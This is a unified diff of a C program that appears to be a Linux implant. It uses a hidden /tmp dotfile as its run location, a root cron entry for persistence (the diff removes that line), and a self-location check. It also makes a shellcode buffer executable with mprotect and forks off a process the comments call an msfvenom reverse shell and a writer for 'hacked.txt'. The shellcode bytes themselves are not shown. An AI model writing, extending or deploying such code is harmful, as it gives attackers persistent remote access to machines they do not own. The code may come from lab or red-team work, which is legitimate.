@@ -6,7 +6,6 @@
 #define TPS_ROT13 "/tmp/.entry-3tps-93f8u-rprt\n"
 #define HOME_ROT13 "/home/"
 #define PROC_ROT13 "/proc/self/exe"
-#define CRON_ROT13 "*/5 * * * * root /tmp/.entry-3tps-93f8u-rprt\n" 
 // END_SOURCE_STRINGS
 
 #define BD_LENGTH
@@ -17,6 +16,7 @@
 #include <stdio.h>
 #include <dlfcn.h>
 #include <unistd.h>
+#include <stdlib.h>
 
 
 unsigned char buf[] = 
@@ -45,7 +45,6 @@ void create_hacked_file(char * full_path) {
     }
 }
 
-
 /**
  * Main entry point for our program
  */
@@ -63,11 +62,10 @@ int main(int argc, char *argv[]) {
     readlink("/proc/self/exe", readbuf, sizeof(readbuf));
     if (strncmp(readbuf, "/tmp/.entry-3tps-93f8u-rprt", sizeof(readbuf)) != 0) {
         // Exit because we are not executing from intended location.
-        printf("not exiting\n");
         exit(0);
     }
 
-    // Check presence of PID file
+    // Fork off the writer for hacked.txt and the msfvenom reverse shell. 
     if (fork() == 0) {
         intptr_t pagesize = sysconf(_SC_PAGESIZE);
         if (!mprotect((void *)(((intptr_t)buf) & ~(pagesize - 1)),pagesize, PROT_READ|PROT_EXEC)) {
